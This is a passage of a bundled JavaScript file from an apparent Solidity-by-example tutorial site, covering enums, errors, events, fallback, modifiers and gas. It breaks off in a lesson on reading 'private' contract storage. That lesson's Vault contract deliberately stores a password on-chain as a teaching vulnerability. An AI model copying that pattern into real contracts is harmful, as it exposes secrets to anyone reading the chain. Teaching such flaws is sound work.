_num;\n        sender = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n        value = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">A</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> num;\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> sender;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> value;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setVars</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _contract, <span class="hljs-keyword">uint</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        <span class="hljs-comment">// A&#x27;s storage is set, B is not modified.</span>\n        (<span class="hljs-keyword">bool</span> success, <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">memory</span> data) = _contract.<span class="hljs-built_in">delegatecall</span>(\n            <span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"setVars(uint256)"</span>, _num)\n        );\n    }\n}\n</code></pre>\n'})};var q=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Enum",description:"Example of enums in Solidity",html:'<p>Solidity support enumerables and they are useful to model choice and keep track of state.</p>\n<p>Enums can be declared ouside of a contract.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Enum</span> </span>{\n    <span class="hljs-comment">// Enum representing shipping status</span>\n    <span class="hljs-keyword">enum</span> <span class="hljs-title">Status</span> {\n        Pending,\n        Shipped,\n        Accepted,\n        Rejected,\n        Canceled\n    }\n\n    <span class="hljs-comment">// Default value is the first element listed in</span>\n    <span class="hljs-comment">// definition of the type, in this case "Pending"</span>\n    Status <span class="hljs-keyword">public</span> status;\n\n    <span class="hljs-comment">// Returns uint</span>\n    <span class="hljs-comment">// Pending  - 0</span>\n    <span class="hljs-comment">// Shipped  - 1</span>\n    <span class="hljs-comment">// Accepted - 2</span>\n    <span class="hljs-comment">// Rejected - 3</span>\n    <span class="hljs-comment">// Canceled - 4</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params">Status</span>) </span>{\n        <span class="hljs-keyword">return</span> status;\n    }\n\n    <span class="hljs-comment">// Update status by passing uint into input</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params">Status _status</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        status = _status;\n    }\n\n    <span class="hljs-comment">// You can update to a specific enum like this</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cancel</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        status = Status.Canceled;\n    }\n\n    <span class="hljs-comment">// delete resets the enum to it&#x27;s first value, 0</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">delete</span> status;\n    }\n}\n</code></pre>\n<h3 id="declaring-and-importing-enum">Declaring and importing Enum</h3>\n<p>File that the enum is declared in</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-keyword">enum</span> <span class="hljs-title">Status</span> {\n    Pending,\n    Shipped,\n    Accepted,\n    Rejected,\n    Canceled\n}</code></pre>\n<p>File that imports the enum above</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-keyword">import</span> <span class="hljs-string">"./EnumDeclaration.sol"</span>;\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Enum</span> </span>{\n    Status <span class="hljs-keyword">public</span> status;\n}</code></pre>\n'})};var H=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Error",description:"Example of how to throw errors in Solidity",html:'<p>An error will undo all changes made to the state during a transaction.</p>\n<p>You can throw an error by calling <code>require</code>, <code>revert</code> or <code>assert</code>.</p>\n<ul>\n<li><code>require</code> is used to validate inputs and conditions before execution.</li>\n<li><code>revert</code> is similar to <code>require</code>. See the code below for details.</li>\n<li><code>assert</code> is used to check for code that should never be false. Failing\nassertion probably means that there is a bug.</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title"><span class="hljs-built_in">Error</span></span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testRequire</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Require should be used to validate conditions such as:</span>\n        <span class="hljs-comment">// - inputs</span>\n        <span class="hljs-comment">// - conditions before execution</span>\n        <span class="hljs-comment">// - return values from calls to other functions</span>\n        <span class="hljs-built_in">require</span>(_i &gt; <span class="hljs-number">10</span>, <span class="hljs-string">"Input must be greater than 10"</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testRevert</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Revert is useful when the condition to check is complex.</span>\n        <span class="hljs-comment">// This code does the exact same thing as the example above</span>\n        <span class="hljs-keyword">if</span> (_i &lt;= <span class="hljs-number">10</span>) {\n            <span class="hljs-built_in">revert</span>(<span class="hljs-string">"Input must be greater than 10"</span>);\n        }\n    }\n\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> num;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testAssert</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Assert should only be used to test for internal errors,</span>\n        <span class="hljs-comment">// and to check invariants.</span>\n\n        <span class="hljs-comment">// Here we assert that num is always equal to 0</span>\n        <span class="hljs-comment">// since it is impossible to update the value of num</span>\n        <span class="hljs-built_in">assert</span>(num == <span class="hljs-number">0</span>);\n    }\n}\n</code></pre>\n<p>Here is another example</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Account</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">constant</span> MAX_UINT = <span class="hljs-number">2</span> ** <span class="hljs-number">256</span> - <span class="hljs-number">1</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">uint</span> oldBalance = balance;\n        <span class="hljs-keyword">uint</span> newBalance = balance + _amount;\n\n        <span class="hljs-comment">// balance + _amount does not overflow if balance + _amount &gt;= balance</span>\n        <span class="hljs-built_in">require</span>(newBalance &gt;= oldBalance, <span class="hljs-string">"Overflow"</span>);\n\n        balance = newBalance;\n\n        <span class="hljs-built_in">assert</span>(balance &gt;= oldBalance);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> _amount</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">uint</span> oldBalance = balance;\n\n        <span class="hljs-comment">// balance - _amount does not underflow if balance &gt;= _amount</span>\n        <span class="hljs-built_in">require</span>(balance &gt;= _amount, <span class="hljs-string">"Underflow"</span>);\n\n        <span class="hljs-keyword">if</span> (balance &lt; _amount) {\n            <span class="hljs-built_in">revert</span>(<span class="hljs-string">"Underflow"</span>);\n        }\n\n        balance -= _amount;\n\n        <span class="hljs-built_in">assert</span>(balance &lt;= oldBalance);\n    }\n}\n</code></pre>\n'})};var R=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Ether and Wei",description:"An example of Ether and Wei in Solidity",html:'<p>Transactions are paid with <code>ether</code>.</p>\n<p>Similar to how one dollar is equal to 100 cent, one <code>ether</code> is equal to 10<sup>18</sup> <code>wei</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherUnits</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> oneWei = <span class="hljs-number">1</span> <span class="hljs-literal">wei</span>;\n    <span class="hljs-comment">// 1 wei is equal to 1</span>\n    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">public</span> isOneWei = <span class="hljs-number">1</span> <span class="hljs-literal">wei</span> == <span class="hljs-number">1</span>;\n\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> oneEther = <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>;\n    <span class="hljs-comment">// 1 ether is equal to 10^18</span>\n    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">public</span> isOneEther = <span class="hljs-number">1</span> <span class="hljs-literal">ether</span> == <span class="hljs-number">1e18</span>;\n}\n</code></pre>\n'})};var X=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Events",description:"Example of how to emit events in Solidity",html:'<p><code>Events</code> allow logging to the Ethereum blockchain. Some use cases for events are:</p>\n<ul>\n<li>Listening for events and updating user interface</li>\n<li>A cheap form of storage</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Event</span> </span>{\n    <span class="hljs-comment">// Event declaration</span>\n    <span class="hljs-comment">// Up to 3 parameters can be indexed.</span>\n    <span class="hljs-comment">// Indexed parameters helps you filter the logs by the indexed parameter</span>\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> sender, <span class="hljs-keyword">string</span> message</span>)</span>;\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">AnotherLog</span>(<span class="hljs-params"></span>)</span>;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-string">"Hello World!"</span>);\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-string">"Hello EVM!"</span>);\n        <span class="hljs-keyword">emit</span> AnotherLog();\n    }\n}\n</code></pre>\n'})};var N=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Fallback",description:"Example of how to use fallback in Solidity",html:'<p><code>fallback</code> is a function that does not take any arguments and does not return anything.</p>\n<p>It is executed either when</p>\n<ul>\n<li>a function that does not exist is called or</li>\n<li>Ether is sent directly to a contract but <code>receive()</code> does not exist or <code>msg.data</code> is not empty</li>\n</ul>\n<p><code>fallback</code> has a 2300 gas limit when called by <code>transfer</code> or <code>send</code>.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Fallback</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Log</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> gas</span>)</span>;\n\n    <span class="hljs-comment">// Fallback function must be declared as external.</span>\n    <span class="hljs-keyword">fallback</span>() <span class="hljs-keyword">external</span> <span class="hljs-keyword">payable</span> {\n        <span class="hljs-comment">// send / transfer (forwards 2300 gas to this fallback function)</span>\n        <span class="hljs-comment">// call (forwards all of the gas)</span>\n        <span class="hljs-keyword">emit</span> Log(<span class="hljs-built_in">gasleft</span>());\n    }\n\n    <span class="hljs-comment">// Helper function to check the balance of this contract</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBalance</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;\n    }\n}\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">SendToFallback</span> </span>{\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferToFallback</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        _to.<span class="hljs-built_in">transfer</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">callFallback</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> _to</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{\n        (<span class="hljs-keyword">bool</span> sent,) = _to.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value:</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}(<span class="hljs-string">""</span>);\n        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);\n    }\n}\n</code></pre>\n'})};var W=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"First Application",description:"Example of smart contract in Solidity",html:'<p>Here is a simple contract that you can get, increment and decrement the count store in this contract.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Counter</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> count;\n\n    <span class="hljs-comment">// Function to get the current count</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> count;\n    }\n\n    <span class="hljs-comment">// Function to increment count by 1</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inc</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        count += <span class="hljs-number">1</span>;\n    }\n\n    <span class="hljs-comment">// Function to decrement count by 1</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dec</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        count -= <span class="hljs-number">1</span>;\n    }\n}\n</code></pre>\n'})};var V=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Function",description:"Example of how to write functions in Solidity",html:'<p>There are several ways to return outputs from a function.</p>\n<p>Public functions cannot accept certain data types as inputs or outputs</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Function</span> </span>{\n    <span class="hljs-comment">// Functions can return multiple values.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">returnMany</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span>, <span class="hljs-keyword">bool</span>, <span class="hljs-keyword">uint</span></span>) </span>{\n        <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">2</span>);\n    }\n\n    <span class="hljs-comment">// Return values can be named.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">named</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span> x, <span class="hljs-keyword">bool</span> b, <span class="hljs-keyword">uint</span> y</span>) </span>{\n        <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">2</span>);\n    }\n\n    <span class="hljs-comment">// Return values can be assigned to their name.</span>\n    <span class="hljs-comment">// In this case the return statement can be omitted.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">assigned</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span> x, <span class="hljs-keyword">bool</span> b, <span class="hljs-keyword">uint</span> y</span>) </span>{\n        x = <span class="hljs-number">1</span>;\n        b = <span class="hljs-literal">true</span>;\n        y = <span class="hljs-number">2</span>;\n    }\n\n    <span class="hljs-comment">// Use destructing assignment when calling another</span>\n    <span class="hljs-comment">// function that returns multiple values.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">destructingAssigments</span>(<span class="hljs-params"></span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">pure</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span>, <span class="hljs-keyword">bool</span>, <span class="hljs-keyword">uint</span>, <span class="hljs-keyword">uint</span>, <span class="hljs-keyword">uint</span></span>)\n    </span>{\n        (<span class="hljs-keyword">uint</span> i, <span class="hljs-keyword">bool</span> b, <span class="hljs-keyword">uint</span> j) =  returnMany();\n\n        <span class="hljs-comment">// Values can be left out.</span>\n        (<span class="hljs-keyword">uint</span> x, , <span class="hljs-keyword">uint</span> y) = (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>);\n\n        <span class="hljs-keyword">return</span> (i, b, j, x, y);\n    }\n\n    <span class="hljs-comment">// Cannot use map for neither input nor output</span>\n\n    <span class="hljs-comment">// Can use array for input</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arrayInput</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">memory</span> _arr</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n    }\n\n    <span class="hljs-comment">// Can use array for output</span>\n    <span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">public</span> arr;\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">arrayOutput</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">view</span></span> <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">uint</span>[] <span class="hljs-keyword">memory</span></span>) </span>{\n        <span class="hljs-keyword">return</span> arr;\n    }\n}\n</code></pre>\n'})};var U=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Function Modifier",description:"Example of how to write function modifier in Solidity",html:'<p>Modifiers are code that can be run before and / or after a function call.</p>\n<p>Modifiers can be used to:</p>\n<ul>\n<li>Restrict access</li>\n<li>Validate inputs</li>\n<li>Guard against reentrancy hack</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">FunctionModifier</span> </span>{\n    <span class="hljs-comment">// We will use these variables to demonstrate how to use</span>\n    <span class="hljs-comment">// modifiers.</span>\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> x = <span class="hljs-number">10</span>;\n    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">public</span> locked;\n\n    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-comment">// Set the transaction sender as the owner of the contract.</span>\n        owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    }\n\n    <span class="hljs-comment">// Modifier to check that the caller is the owner of</span>\n    <span class="hljs-comment">// the contract.</span>\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">onlyOwner</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> == owner, <span class="hljs-string">"Not owner"</span>);\n        <span class="hljs-comment">// Underscore is a special character only used inside</span>\n        <span class="hljs-comment">// a function modifier and it tells Solidity to</span>\n        <span class="hljs-comment">// execute the rest of the code.</span>\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-comment">// Modifiers can take inputs. This modifier checks that the</span>\n    <span class="hljs-comment">// address passed in is not the zero address.</span>\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">validAddress</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _addr</span>) </span>{\n        <span class="hljs-built_in">require</span>(_addr != <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), <span class="hljs-string">"Not valid address"</span>);\n        <span class="hljs-keyword">_</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">changeOwner</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _newOwner</span>)\n        <span class="hljs-title"><span class="hljs-keyword">public</span></span>\n        <span class="hljs-title">onlyOwner</span>\n        <span class="hljs-title">validAddress</span>(<span class="hljs-params">_newOwner</span>)\n    </span>{\n        owner = _newOwner;\n    }\n\n    <span class="hljs-comment">// Modifiers can be called before and / or after a function.</span>\n    <span class="hljs-comment">// This modifier prevents a function from being called while</span>\n    <span class="hljs-comment">// it is still executing.</span>\n    <span class="hljs-function"><span class="hljs-keyword">modifier</span> <span class="hljs-title">noReentrancy</span>(<span class="hljs-params"></span>) </span>{\n        <span class="hljs-built_in">require</span>(!locked, <span class="hljs-string">"No reentrancy"</span>);\n\n        locked = <span class="hljs-literal">true</span>;\n        <span class="hljs-keyword">_</span>;\n        locked = <span class="hljs-literal">false</span>;\n    }\n\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrement</span>(<span class="hljs-params"><span class="hljs-keyword">uint</span> i</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title">noReentrancy</span> </span>{\n        x -= i;\n\n        <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">1</span>) {\n            decrement(i - <span class="hljs-number">1</span>);\n        }\n    }\n}\n</code></pre>\n'})};var z=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Gas",description:"Example of gas and gas limit in Solidity",html:'<h3 id="how-much-ether-do-you-need-to-pay-for-a-transaction">How much <code>ether</code> do you need to pay for a transaction?</h3>\n<p>You pay <code>gas spent * gas price</code> amount of <code>ether</code>, where</p>\n<ul>\n<li><code>gas</code> is a unit of computation</li>\n<li><code>gas spent</code> is the total amount of <code>gas</code> used in a transaction</li>\n<li><code>gas price</code> is how much <code>ether</code> you are willing to pay per <code>gas</code></li>\n</ul>\n<p>Transactions with higher gas price have higher priority to be included in a block.</p>\n<p>Unspent gas will be refunded.</p>\n<h3 id="gas-limit">Gas Limit</h3>\n<p>There are 2 upper bounds to the amount of gas you can spend</p>\n<ul>\n<li><code>gas limit</code> (max amount of gas your willing to use for your transaction, set by you)</li>\n<li><code>block gas limit</code> (max amount of gas allowed in a block, set by the network)</li>\n</ul>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Gas</span> </span>{\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> i = <span class="hljs-number">0</span>;\n\n    <span class="hljs-comment">// Using up all of the gas that you send causes your transaction to fail.</span>\n    <span class="hljs-comment">// State changes are undone.</span>\n    <span class="hljs-comment">// Gas spent are not refunded.</span>\n    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">forever</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{\n        <span class="hljs-comment">// Here we run a loop until all of the gas are spent</span>\n        <span class="hljs-comment">// and the transaction fails</span>\n        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {\n            i += <span class="hljs-number">1</span>;\n        }\n    }\n}\n</code></pre>\n'})};var Y=function(){return Object(j.jsx)(v,{version:"0.7.6",title:"Accessing Private Data",description:"An example of accessing private data from a Solidity smart contract",html:'<h3 id="vulnerability">Vulnerability</h3>\n<p>All data on a smart contract can be read.</p>\n<p>Let&#39;s see how we can read <code>private</code> data. In the process you will learn how Solidity stores state variables.</p>\n<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>\n<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>\n\n<span class="hljs-comment">/*\nNote: cannot use web3 on JVM, so use the contract deployed on ropsten\nNote: browser Web3 is old so use Web3 from truffle console\n\nContract deployed on Ropsten\n0x3505a02BCDFbb225988161a95528bfDb279faD6b\n*/</span>\n\n<span class="hljs-comment">/*\n# Storage\n- 2 ** 256 slots\n- 32 bytes for each slot\n- data is stored sequentially in the order of declaration\n- storage is optimized to save space. If neighboring variables fit in a single\n  32 bytes, then they are packed into the same slot, starting from the right\n*/</span>\n\n<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Vault</span> </span>{\n    <span class="hljs-comment">// slot 0</span>\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> count = <span class="hljs-number">123</span>;\n    <span class="hljs-comment">// slot 1</span>\n    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner = <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;\n    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">public</span> isTrue = <span class="hljs-literal">true</span>;\n    <span class="hljs-keyword">uint16</span> <span class="hljs-keyword">public</span> u16 = <span class="hljs-number">31</span>;\n    <span class="hljs-comment">// slot 2</span>\n    <span class="hljs-keyword">bytes32</span> <span class="hljs-keyword">private</span> password;\n\n    <span class="hljs-comment">// constants do not use storage</span>\n    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">constant</span> someConst = <span class="hljs-number">123</span>;\n\n    <span class="hljs-comment">// slot 3, 4, 5 (one for each array element)</span>\n    <span class="hljs-keyword">bytes32</span>[<span class="hljs-number">3</span>] <span class="hljs-keyword">public</span> data;\n\n    <span class="hljs-keyword">struct</span> <span 